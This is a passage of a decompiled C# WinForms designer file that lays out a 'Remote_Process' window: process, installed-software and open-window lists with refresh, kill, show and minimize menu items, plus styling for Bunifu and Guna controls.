			this.panel2.Size = new System.Drawing.Size(1111, 569);
			this.panel2.TabIndex = 2;
			this.bunifuIconButton3.AllowAnimations = true;
			this.bunifuIconButton3.AllowBorderColorChanges = true;
			this.bunifuIconButton3.AllowMouseEffects = true;
			this.bunifuIconButton3.AnimationSpeed = 200;
			this.bunifuIconButton3.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton3.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton3.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton3.BorderRadius = 1;
			this.bunifuIconButton3.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton3.BorderThickness = 1;
			this.bunifuIconButton3.ColorContrastOnClick = 30;
			this.bunifuIconButton3.ColorContrastOnHover = 30;
			this.bunifuIconButton3.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.bunifuIconButton3.CustomizableEdges = borderEdges;
			this.bunifuIconButton3.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton3.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton3.Image");
			this.bunifuIconButton3.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton3.Location = new System.Drawing.Point(201, 3);
			this.bunifuIconButton3.Name = "bunifuIconButton3";
			this.bunifuIconButton3.RoundBorders = false;
			this.bunifuIconButton3.ShowBorders = true;
			this.bunifuIconButton3.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton3.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton3.TabIndex = 89;
			this.bunifuIconButton3.Click += new System.EventHandler(bunifuIconButton3_Click);
			this.bunifuIconButton1.AllowAnimations = true;
			this.bunifuIconButton1.AllowBorderColorChanges = true;
			this.bunifuIconButton1.AllowMouseEffects = true;
			this.bunifuIconButton1.AnimationSpeed = 200;
			this.bunifuIconButton1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton1.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton1.BorderRadius = 1;
			this.bunifuIconButton1.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton1.BorderThickness = 1;
			this.bunifuIconButton1.ColorContrastOnClick = 30;
			this.bunifuIconButton1.ColorContrastOnHover = 30;
			this.bunifuIconButton1.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges2.BottomLeft = true;
			borderEdges2.BottomRight = true;
			borderEdges2.TopLeft = true;
			borderEdges2.TopRight = true;
			this.bunifuIconButton1.CustomizableEdges = borderEdges2;
			this.bunifuIconButton1.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton1.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton1.Image");
			this.bunifuIconButton1.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton1.Location = new System.Drawing.Point(361, 3);
			this.bunifuIconButton1.Name = "bunifuIconButton1";
			this.bunifuIconButton1.RoundBorders = false;
			this.bunifuIconButton1.ShowBorders = true;
			this.bunifuIconButton1.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton1.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton1.TabIndex = 88;
			this.bunifuIconButton1.Click += new System.EventHandler(bunifuIconButton1_Click);
			this.bunifuIconButton6.AllowAnimations = true;
			this.bunifuIconButton6.AllowBorderColorChanges = true;
			this.bunifuIconButton6.AllowMouseEffects = true;
			this.bunifuIconButton6.AnimationSpeed = 200;
			this.bunifuIconButton6.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton6.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton6.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton6.BorderRadius = 1;
			this.bunifuIconButton6.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton6.BorderThickness = 1;
			this.bunifuIconButton6.ColorContrastOnClick = 30;
			this.bunifuIconButton6.ColorContrastOnHover = 30;
			this.bunifuIconButton6.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges3.BottomLeft = true;
			borderEdges3.BottomRight = true;
			borderEdges3.TopLeft = true;
			borderEdges3.TopRight = true;
			this.bunifuIconButton6.CustomizableEdges = borderEdges3;
			this.bunifuIconButton6.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton6.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton6.Image");
			this.bunifuIconButton6.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton6.Location = new System.Drawing.Point(3, 3);
			this.bunifuIconButton6.Name = "bunifuIconButton6";
			this.bunifuIconButton6.RoundBorders = false;
			this.bunifuIconButton6.ShowBorders = true;
			this.bunifuIconButton6.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton6.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton6.TabIndex = 87;
			this.bunifuIconButton6.Click += new System.EventHandler(linkLabel1_LinkClicked);
			this.linkLabel3.ActiveLinkColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.linkLabel3.AutoSize = true;
			this.linkLabel3.LinkBehavior = System.Windows.Forms.LinkBehavior.HoverUnderline;
			this.linkLabel3.LinkColor = System.Drawing.Color.WhiteSmoke;
			this.linkLabel3.Location = new System.Drawing.Point(403, 20);
			this.linkLabel3.Name = "linkLabel3";
			this.linkLabel3.Size = new System.Drawing.Size(139, 17);
			this.linkLabel3.TabIndex = 7;
			this.linkLabel3.TabStop = true;
			this.linkLabel3.Text = "Software Installation";
			this.linkLabel3.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabel3_LinkClicked);
			this.linkLabel2.ActiveLinkColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.linkLabel2.AutoSize = true;
			this.linkLabel2.LinkBehavior = System.Windows.Forms.LinkBehavior.HoverUnderline;
			this.linkLabel2.LinkColor = System.Drawing.Color.WhiteSmoke;
			this.linkLabel2.Location = new System.Drawing.Point(243, 20);
			this.linkLabel2.Name = "linkLabel2";
			this.linkLabel2.Size = new System.Drawing.Size(111, 17);
			this.linkLabel2.TabIndex = 5;
			this.linkLabel2.TabStop = true;
			this.linkLabel2.Text = "Display Window";
			this.linkLabel2.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabel2_LinkClicked);
			this.linkLabel1.ActiveLinkColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.linkLabel1.AutoSize = true;
			this.linkLabel1.LinkBehavior = System.Windows.Forms.LinkBehavior.HoverUnderline;
			this.linkLabel1.LinkColor = System.Drawing.Color.WhiteSmoke;
			this.linkLabel1.Location = new System.Drawing.Point(45, 20);
			this.linkLabel1.Name = "linkLabel1";
			this.linkLabel1.Size = new System.Drawing.Size(149, 17);
			this.linkLabel1.TabIndex = 2;
			this.linkLabel1.TabStop = true;
			this.linkLabel1.Text = "Process management";
			this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabel1_LinkClicked);
			this.listView1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.listView1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
			this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[4] { this.columnHeader2, this.columnHeader3, this.columnHeader4, this.columnHeader5 });
			this.listView1.ContextMenuStrip = this.contextMenuStrip1;
			this.listView1.Font = new System.Drawing.Font("Century Gothic", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.listView1.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.listView1.FullRowSelect = true;
			this.listView1.HideSelection = false;
			this.listView1.Location = new System.Drawing.Point(0, 56);
			this.listView1.MultiSelect = false;
			this.listView1.Name = "listView1";
			this.listView1.OwnerDraw = true;
			this.listView1.Size = new System.Drawing.Size(1111, 513);
			this.listView1.TabIndex = 0;
			this.listView1.UseCompatibleStateImageBehavior = false;
			this.listView1.View = System.Windows.Forms.View.Details;
			this.listView1.ColumnClick += new System.Windows.Forms.ColumnClickEventHandler(listView1_ColumnClick);
			this.listView1.DrawColumnHeader += new System.Windows.Forms.DrawListViewColumnHeaderEventHandler(listView1_DrawColumnHeader_1);
			this.listView1.DrawItem += new System.Windows.Forms.DrawListViewItemEventHandler(listView1_DrawItem_1);
			this.listView1.DrawSubItem += new System.Windows.Forms.DrawListViewSubItemEventHandler(listView1_DrawSubItem_1);
			this.listView1.ItemMouseHover += new System.Windows.Forms.ListViewItemMouseHoverEventHandler(listView1_ItemMouseHover);
			this.columnHeader2.Text = "Process Name";
			this.columnHeader2.Width = 165;
			this.columnHeader3.Text = "PID";
			this.columnHeader3.Width = 129;
			this.columnHeader4.Text = "Integrity";
			this.columnHeader4.Width = 108;
			this.columnHeader5.Text = "Command Line";
			this.columnHeader5.Width = 1000;
			this.contextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.contextMenuStrip1.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.refreshToolStripMenuItem, this.forceKillToolStripMenuItem, this.killToolStripMenuItem });
			this.contextMenuStrip1.Name = "contextMenuStrip1";
			this.contextMenuStrip1.ShowImageMargin = false;
			this.contextMenuStrip1.Size = new System.Drawing.Size(278, 70);
			this.refreshToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.refreshToolStripMenuItem.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.refreshToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
			this.refreshToolStripMenuItem.Size = new System.Drawing.Size(277, 22);
			this.refreshToolStripMenuItem.Text = "Refresh";
			this.refreshToolStripMenuItem.Click += new System.EventHandler(refreshToolStripMenuItem_Click);
			this.forceKillToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.forceKillToolStripMenuItem.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.forceKillToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.forceKillToolStripMenuItem.Name = "forceKillToolStripMenuItem";
			this.forceKillToolStripMenuItem.Size = new System.Drawing.Size(277, 22);
			this.forceKillToolStripMenuItem.Text = "Force Kill (requires high permissions)";
			this.forceKillToolStripMenuItem.Click += new System.EventHandler(forceKillToolStripMenuItem_Click);
			this.killToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.killToolStripMenuItem.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.killToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.killToolStripMenuItem.Name = "killToolStripMenuItem";
			this.killToolStripMenuItem.Size = new System.Drawing.Size(277, 22);
			this.killToolStripMenuItem.Text = "Kill Process";
			this.killToolStripMenuItem.Click += new System.EventHandler(killToolStripMenuItem_Click);
			this.label2.AutoSize = true;
			this.label2.Font = new System.Drawing.Font("Century Gothic", 12f);
			this.label2.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.label2.Location = new System.Drawing.Point(583, 14);
			this.label2.Name = "label2";
			this.label2.Size = new System.Drawing.Size(95, 21);
			this.label2.TabIndex = 3;
			this.label2.Text = "Process :[0]";
			this.listView3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.listView3.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.listView3.BorderStyle = System.Windows.Forms.BorderStyle.None;
			this.listView3.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.columnHeader1, this.columnHeader6 });
			this.listView3.ContextMenuStrip = this.contextMenuStrip2;
			this.listView3.Font = new System.Drawing.Font("Century Gothic", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.listView3.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.listView3.FullRowSelect = true;
			this.listView3.HideSelection = false;
			this.listView3.Location = new System.Drawing.Point(0, 56);
			this.listView3.MultiSelect = false;
			this.listView3.Name = "listView3";
			this.listView3.OwnerDraw = true;
			this.listView3.Size = new System.Drawing.Size(1111, 513);
			this.listView3.TabIndex = 8;
			this.listView3.UseCompatibleStateImageBehavior = false;
			this.listView3.View = System.Windows.Forms.View.Details;
			this.listView3.DrawColumnHeader += new System.Windows.Forms.DrawListViewColumnHeaderEventHandler(listView3_DrawColumnHeader);
			this.listView3.DrawItem += new System.Windows.Forms.DrawListViewItemEventHandler(listView3_DrawItem);
			this.listView3.DrawSubItem += new System.Windows.Forms.DrawListViewSubItemEventHandler(listView3_DrawSubItem);
			this.columnHeader1.Text = "Setup Name";
			this.columnHeader1.Width = 200;
			this.columnHeader6.Text = "Setup Path";
			this.columnHeader6.Width = 1000;
			this.contextMenuStrip2.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.contextMenuStrip2.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.contextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.refreshToolStripMenuItem1 });
			this.contextMenuStrip2.Name = "contextMenuStrip2";
			this.contextMenuStrip2.ShowImageMargin = false;
			this.contextMenuStrip2.Size = new System.Drawing.Size(97, 26);
			this.refreshToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.refreshToolStripMenuItem1.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.refreshToolStripMenuItem1.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.refreshToolStripMenuItem1.Name = "refreshToolStripMenuItem1";
			this.refreshToolStripMenuItem1.Size = new System.Drawing.Size(96, 22);
			this.refreshToolStripMenuItem1.Text = "Refresh";
			this.refreshToolStripMenuItem1.Click += new System.EventHandler(refreshToolStripMenuItem1_Click);
			this.listView2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.listView2.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.listView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
			this.listView2.ContextMenuStrip = this.contextMenuStrip3;
			this.listView2.Font = new System.Drawing.Font("Century Gothic", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.listView2.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.listView2.HideSelection = false;
			this.listView2.Location = new System.Drawing.Point(0, 56);
			this.listView2.Name = "listView2";
			this.listView2.Size = new System.Drawing.Size(1111, 523);
			this.listView2.SmallImageList = this.imageList1;
			this.listView2.TabIndex = 1;
			this.listView2.UseCompatibleStateImageBehavior = false;
			this.listView2.View = System.Windows.Forms.View.List;
			this.contextMenuStrip3.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.contextMenuStrip3.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.contextMenuStrip3.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.刷新ToolStripMenuItem, this.显示ToolStripMenuItem, this.最小化ToolStripMenuItem, this.结束进程ToolStripMenuItem });
			this.contextMenuStrip3.Name = "contextMenuStrip3";
			this.contextMenuStrip3.ShowImageMargin = false;
			this.contextMenuStrip3.Size = new System.Drawing.Size(107, 92);
			this.刷新ToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.刷新ToolStripMenuItem.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.刷新ToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.刷新ToolStripMenuItem.Name = "刷新ToolStripMenuItem";
			this.刷新ToolStripMenuItem.Size = new System.Drawing.Size(106, 22);
			this.刷新ToolStripMenuItem.Text = "Refresh";
			this.刷新ToolStripMenuItem.Click += new System.EventHandler(刷新ToolStripMenuItem_Click);
			this.显示ToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.显示ToolStripMenuItem.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.显示ToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.显示ToolStripMenuItem.Name = "显示ToolStripMenuItem";
			this.显示ToolStripMenuItem.Size = new System.Drawing.Size(106, 22);
			this.显示ToolStripMenuItem.Text = "Show";
			this.显示ToolStripMenuItem.Click += new System.EventHandler(显示ToolStripMenuItem_Click);
			this.最小化ToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.最小化ToolStripMenuItem.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.最小化ToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.最小化ToolStripMenuItem.Name = "最小化ToolStripMenuItem";
			this.最小化ToolStripMenuItem.Size = new System.Drawing.Size(106, 22);
			this.最小化ToolStripMenuItem.Text = "Minimize";
			this.最小化ToolStripMenuItem.Click += new System.EventHandler(最小化ToolStripMenuItem_Click);
			this.结束进程ToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.结束进程ToolStripMenuItem.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.结束进程ToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.结束进程ToolStripMenuItem.Name = "结束进程ToolStripMenuItem";
			this.结束进程ToolStripMenuItem.Size = new System.Drawing.Size(106, 22);
			this.结束进程ToolStripMenuItem.Text = "Finish";
			this.结束进程ToolStripMenuItem.Click += new System.EventHandler(结束ToolStripMenuItem_Click);
			this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
			this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
			this.imageList1.Images.SetKeyName(0, "exe_50px.png");
			this.pictureBox3.Location = new System.Drawing.Point(974, 32);
			this.pictureBox3.Name = "pictureBox3";
			this.pictureBox3.Size = new System.Drawing.Size(23, 24);
			this.pictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.pictureBox3.TabIndex = 6;
			this.pictureBox3.TabStop = false;
			this.pictureBox3.Visible = false;
			this.pictureBox2.Location = new System.Drawing.Point(945, 33);
			this.pictureBox2.Name = "pictureBox2";
			this.pictureBox2.Size = new System.Drawing.Size(23, 24);
			this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.pictureBox2.TabIndex = 4;
			this.pictureBox2.TabStop = false;
			this.pictureBox2.Visible = false;
			this.pictureBox1.Location = new System.Drawing.Point(916, 33);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new System.Drawing.Size(23, 24);
			this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.pictureBox1.TabIndex = 3;
			this.pictureBox1.TabStop = false;
			this.pictureBox1.Visible = false;
			this.toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
			this.label3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.label3.AutoSize = true;
			this.label3.Font = new System.Drawing.Font("Century Gothic", 12f);
			this.label3.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.label3.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
			this.label3.Location = new System.Drawing.Point(22, 637);
			this.label3.Name = "label3";
			this.label3.Size = new System.Drawing.Size(121, 21);
			this.label3.TabIndex = 4;
			this.label3.Text = "Status : Ready";
			this.label3.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
			this.imageList2.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit;
			this.imageList2.ImageSize = new System.Drawing.Size(16, 16);
			this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			this.bunifuSeparator2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(1, 665);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(4, 7, 4, 7);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(1157, 16);
			this.bunifuSeparator2.TabIndex = 249;
			this.bunifuSeparator1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(1, -8);
			this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(5, 9, 5, 9);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator1.Size = new System.Drawing.Size(1157, 16);
			this.bunifuSeparator1.TabIndex = 250;
			this.bunifuSeparator4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator4.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator4.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator4.BackgroundImage");
			this.bunifuSeparator4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator4.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator4.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator4.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator4.LineThickness = 1;
			this.bunifuSeparator4.Location = new System.Drawing.Point(1151, 2);
			this.bunifuSeparator4.Margin = new System.Windows.Forms.Padding(4, 9, 4, 9);
			this.bunifuSeparator4.Name = "bunifuSeparator4";
			this.bunifuSeparator4.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator4.Size = new System.Drawing.Size(10, 671);
			this.bunifuSeparator4.TabIndex = 252;
			this.bunifuSeparator3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuSeparator3.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator3.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator3.BackgroundImage");
			this.bunifuSeparator3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator3.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator3.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator3.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator3.LineThickness = 1;
			this.bunifuSeparator3.Location = new System.Drawing.Point(-5, 2);
			this.bunifuSeparator3.Margin = new System.Windows.Forms.Padding(5, 12, 5, 12);
			this.bunifuSeparator3.Name = "bunifuSeparator3";
			this.bunifuSeparator3.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator3.Size = new System.Drawing.Size(10, 671);
			this.bunifuSeparator3.TabIndex = 253;
			base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 17f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(1157, 674);
			base.Controls.Add(this.bunifuSeparator3);
			base.Controls.Add(this.pictureBox3);
			base.Controls.Add(this.bunifuSeparator4);
			base.Controls.Add(this.pictureBox2);
			base.Controls.Add(this.bunifuSeparator1);
			base.Controls.Add(this.pictureBox1);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add(this.metroSetControlBox1);
			base.Controls.Add(this.pictureBox4);
			base.Controls.Add(this.label1);
			base.Controls.Add(this.label3);
			base.Controls.Add(this.panel2);
			this.Font = new System.Drawing.Font("Century Gothic", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Remote_Process";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Remote_Process";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Remote_Process_FormClosed);
			base.Load += new System.EventHandler(Remote_Process_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(Remote_Process_MouseDown);
			((System.ComponentModel.ISupportInitialize)this.pictureBox4).EndInit();
			this.panel2.ResumeLayout(false);
			this.panel2.PerformLayout();
			this.contextMenuStrip1.ResumeLayout(false);
			this.contextMenuStrip2.ResumeLayout(false);
			this.contextMenuStrip3.ResumeLayout(false);
			((System.ComponentModel.ISupportInitialize)this.pictureBox3).EndInit();
			((System.ComponentModel.ISupportInitialize)this.pictureBox2).EndInit();
			((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
